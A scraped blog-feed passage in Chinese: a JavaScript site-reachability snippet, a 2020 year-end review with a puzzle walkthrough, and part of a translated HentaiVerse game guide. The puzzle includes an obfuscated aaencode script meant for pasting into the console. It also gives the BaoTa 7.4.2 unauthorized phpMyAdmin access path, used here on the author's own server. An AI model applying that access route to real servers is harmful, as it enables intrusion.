</span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\"><span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"无法加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"可以加载\"</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 4分8秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量...</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2433\"></a>\n<h2>MDx</h2>\n<p>一年中，MDx 更新了 7 次，新增 328 commits (<span>+91.8%</span>)，Star 数增加了 306，现有 614。感谢所有人的支持。当然，虽然 2.0 咕咕咕了很久（甚至离最早的承诺已经过去将近一年半了），但我已经在对 2.0 进行最后的完善（改动确实比较大）。相信在 2021 的开头，MDx 2.0 就能顺利发布了。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"mdx\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/mdx\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<h1>大事记</h1>\n<ul>\n<li>一月：我经历过的最长的“寒假”开始了</li>\n<li>二月：GitHub followers 换虚拟币，成功换到 3.5k CNY 没有翻车</li>\n<li>三月：<a href=\"https://flyhigher.top/develop/2160.html\">WP-WebAuthn</a> 插件成功上线 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WordPress 插件目录</a>\n</li>\n<li>四月：Cytus II 主线大结局<del>，我当场通关 </del>\n</li>\n<li>五月：开始学车</li>\n<li>五月：MDx 达到 500 Stars</li>\n<li>七月：第一次实习，公司的前端技术栈和我熟悉的完全一致<del>，于是愉快地在公司里写了一个半月的各种表格 </del>\n</li>\n<li>八月：实习结束，部门同事都很棒，确实学到了很多</li>\n<li>九月：和 Ralph 面基一整天</li>\n<li>九月：入手树莓派 4B</li>\n<li>十月：搬家</li>\n<li>十月：和宁诺合作的 H5 上线</li>\n<li>十一月：TEDxNingbo 年度大会，H5 上线<del>，持续摸鱼中 </del>\n</li>\n<li>十一月：终于买了块副屏，<del> 秃头 </del>写代码更快乐了</li>\n<li>十二月：MDx 喜提 600 Stars</li>\n</ul>\n<h1>跨年红包</h1>\n<p><del>传统艺能时间！和以前一样，红包不是白拿的，你需要一点点技术力来解密拿到红包。有效期截至 2021 年 1 月 1 日 22 时。</del></p>\n<p>今年的解谜旅程，从下面这段颜文字开始。</p>\n<pre>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\\\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_')</pre>\n<p><del>和去年一样，红包限时不限量。</del>为了保持解谜乐趣，请不要将答案透露给他人，也请不要重复领取红包，否则视情况活动可能会提前结束。</p>\n<p>由于出现大量重复领取/未解题即领取红包的现象，红包解谜活动立即结束，当前红包领完后将不再更新新的红包口令码。<strong>我发起红包解谜活动是为了解题的乐趣而不是发钱，请各位理解。</strong>以下是详细信息。</p>\n<p>出于对参与者的信任，今年的题目中没有对参与者是否已完成前序步骤进行任何验证，但在最后的 WebSocket 中我记录下了所有成功连接的 IP。今年共发出了 32 个红包，但最后一个步骤的日志只记录到了 25 个不重复 IP（鉴于第一批 10 个红包领完时只记录到了四个 IP，实际人数应该小于 25）。查阅支付宝的红包领取记录可以发现有多位用户多次领取了红包，还有一些用户疑似是从他人处获取答案并直接领取的。鉴于活动已经完全失去意义，我选择提前结束了红包解谜活动。</p>\n<h2>红包答案</h2>\n<p>现在，让我们来看看答案吧。今年的题目难度不高，由于事情比较多，我的准备时间确实不多。</p>\n<p>第一阶段非常简单，这段颜文字就是 Javascript，只是使用了著名的 aaencode 将其编码为了颜文字<del>（多亏了 js 优秀的自动类型转换）</del>。将这段颜文字扔进浏览器控制台即可得到 <code>https://rp.dlij.site/2021/</code>。</p>\n<p>前往这个 URL，可以看到这张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/index.png\" alt=\"\" width=\"2000\" height=\"1125\" class=\"aligncenter size-full wp-image-2444\"></a>\n<p>今年八月宝塔面板 7.4.2 的 phpMyAdmin 未授权访问漏洞很多人都知道了，如果你不清楚，搜索“宝塔面板 7.4.2”也能找到相关信息。首先找到 <code>rp.dlij.site</code> 对应的 IP 是 <code>121.196.27.125</code>，访问 <code>http://121.196.27.125:888/pma</code> 即可看到一个 phpMyAdmin 的界面（为了把这个页面扒下来我还装了一个真的宝塔面板...）。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/pma.jpg\" alt=\"\" width=\"1600\" height=\"867\" class=\"aligncenter size-full wp-image-2448\"></a>\n<p>可以看到信息是 <code>7972632E6D652F6738546D444A3132</code>。和前年一样，这其实是十六进制的 ASCII 码，每两位转为 ASCII 字符即可得到 <code>yrc.me/g8TmDJ12</code>。访问这个页面，可以看到如下信息。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka's Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 